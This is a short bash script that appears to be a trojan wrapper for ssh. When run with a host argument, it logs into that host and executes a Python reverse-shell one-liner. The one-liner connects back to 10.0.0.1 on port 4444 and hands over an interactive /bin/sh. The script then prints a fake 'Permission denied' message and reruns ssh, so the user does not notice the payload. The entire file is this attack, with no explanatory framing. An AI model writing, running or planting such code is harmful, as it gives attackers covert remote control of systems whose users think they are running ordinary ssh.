#!/bin/bash
PORT=4444
IP="10.0.0.1"
/usr/bin/ssh -T $1 << EOF

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($IP,$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

EOF
echo "Permission denied, please try again."
/usr/bin/ssh -T $1 

